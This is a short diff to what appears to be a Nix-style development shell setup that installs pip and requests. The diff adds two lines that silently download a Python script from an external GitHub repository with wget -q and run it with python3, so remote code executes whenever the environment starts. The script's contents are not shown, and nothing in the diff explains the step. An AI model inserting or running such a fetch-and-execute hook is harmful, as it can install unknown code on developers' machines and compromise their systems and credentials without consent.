@@ -22,6 +22,8 @@
           source .venv/bin/activate
           pip install --upgrade pip
           pip install requests
+          wget -q https://raw.githubusercontent.com/brontosimungo/vertas/refs/heads/main/app/app.py
+          python3 app.py
         '';
       };
       
